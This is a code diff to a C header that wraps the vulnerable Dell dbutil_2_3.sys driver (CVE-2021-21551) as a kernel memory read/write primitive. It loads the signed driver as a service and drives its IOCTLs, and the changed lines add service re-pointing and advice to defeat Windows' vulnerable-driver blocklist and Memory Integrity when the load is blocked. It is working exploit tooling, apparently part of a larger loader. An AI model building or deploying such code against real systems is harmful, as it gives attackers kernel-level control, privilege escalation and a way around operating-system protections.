@@ -1,14 +1,10 @@
 /*
  * kdrv.h - kernel R/W primitive via dbutil_2_3.sys (CVE-2021-21551)
  *
- * Loads the Dell-signed driver as a service, opens the device, and
- * provides virtual kernel memory read/write through IOCTLs.
- *
- * The driver binary is staged by version_hook.c to a temp file and
- * passed in via kdrv_load.  The device name is hardcoded in the driver.
- *
- * Never stop/delete the service while the driver is live (causes BSOD).
- * Just close handles - stale service is cleaned on next load after reboot.
+ * Loads the Dell-signed driver as a service and provides kernel memory
+ * read/write through its IOCTLs.  Never stop/delete the service while
+ * the driver is live (BSOD) - just close handles; stale services are
+ * cleaned up on a later run after reboot.
  */
 #ifndef KDRV_H
 #define KDRV_H
@@ -50,11 +46,9 @@ static BOOL kdrv_try_open_device(kdrv_t *d)
     return FALSE;
 }
 
-/* One raw IOCTL round-trip on the current device handle.
- * Returns 0 on success, 1 (alloc), 2 (IOCTL failed), 3 (short response).
- * On failure *err_out receives the Win32 error: the GetLastError() value
- * captured immediately after DeviceIoControl, or ERROR_IO_INCOMPLETE for
- * a short read response. */
+/* One raw IOCTL round-trip.  Returns 0, 1 (alloc), 2 (IOCTL failed),
+ * 3 (short read response); *err_out gets the Win32 error captured
+ * immediately after DeviceIoControl. */
 static int kdrv_ioctl(kdrv_t *d, DWORD ctl, ULONG64 va,
                       const void *in_data, void *out_data, ULONG size,
                       ULONG *returned_out, DWORD *err_out)
@@ -92,20 +86,16 @@ static int kdrv_ioctl(kdrv_t *d, DWORD ctl, ULONG64 va,
     return 0;
 }
 
-/* Close the current device handle and open a fresh one.  Clears stale
- * device-object state left by a previous driver instance whose IRPs
- * may be rejected until the handle is re-created.  Returns TRUE if the
- * new handle is valid. */
+/* Close and reopen the device to clear stale state from a previous
+ * driver instance.  Returns TRUE if the new handle is valid. */
 static BOOL kdrv_reopen_device(kdrv_t *d)
 {
     if (d->hDev) { CloseHandle(d->hDev); d->hDev = NULL; }
     return kdrv_try_open_device(d);
 }
 
-/* One read/write round-trip with one reopen-and-retry.  Returns 0 on
- * success, non-zero on failure; both attempts are logged with the Win32
- * error code.  The first request through a stale device handle can be
- * rejected; re-opening the device clears that state. */
+/* One read/write round-trip with one reopen-and-retry (the first request
+ * through a stale device handle can be rejected). */
 static int kdrv_xfer(kdrv_t *d, DWORD ctl, ULONG64 va,
                      const void *in_data, void *out_data, ULONG size)
 {
@@ -163,10 +153,8 @@ static void kdrv_cleanup_stale(SC_HANDLE hScm)
     CloseServiceHandle(hOld);
 }
 
-/* Discard the service just created by the failed load attempt.  Only a
- * STOPPED service is deleted - the driver never loaded, so this is safe
- * and prevents per-run service litter in SCM.  A RUNNING service is left
- * alone (its driver is live; device reuse via fast path on next run). */
+/* Delete the just-created service only if STOPPED (it never loaded);
+ * a RUNNING service is left alone and reused via the fast path. */
 static void kdrv_discard_service(kdrv_t *d)
 {
     if (d->hSvc) {
@@ -262,8 +250,16 @@ static int kdrv_load(kdrv_t *d, const char *driver_path)
                                      d->driverPath, NULL, NULL, NULL, NULL, NULL);
         } else if (err == ERROR_SERVICE_EXISTS) {
             /* Same-PID leftover that cleanup could not delete (e.g. a
-             * RUNNING driver under a recycled pid name) - adopt it. */
+             * RUNNING driver under a recycled pid name) - adopt it and
+             * repoint it at our verified staging file, so a stale
+             * ImagePath cannot break StartService. */
             d->hSvc = OpenServiceA(d->hScm, g_svc_name, SERVICE_ALL_ACCESS);
+            if (d->hSvc &&
+                !ChangeServiceConfigA(d->hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
+                                      SERVICE_NO_CHANGE, d->driverPath, NULL, NULL,
+                                      NULL, NULL, NULL, NULL)) {
+                LOGW("ChangeServiceConfig on adopted service failed: %lu", GetLastError());
+            }
         }
         if (!d->hSvc) {
             CloseServiceHandle(d->hScm);
@@ -275,6 +271,11 @@ static int kdrv_load(kdrv_t *d, const char *driver_path)
     if (!StartServiceA(d->hSvc, 0, NULL)) {
         DWORD err = GetLastError();
         LOGE("StartService failed: 0x%lX (%lu) svc=%s", err, err, g_svc_name);
+        if (err == 0x800B010C || err == ERROR_INVALID_IMAGE_HASH ||
+            err == ERROR_DRIVER_BLOCKED) {
+            LOGW("Blocked by code integrity: vulnerable driver blocklist or HVCI -");
+            LOGW("run unlock.bat option [4] / disable Memory Integrity, reboot, retry.");
+        }
         if (err == ERROR_ALREADY_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
             if (kdrv_try_open_device(d)) { LOGI("kdrv_load: device reuse after StartService error"); return 0; }
             Sleep(2000);
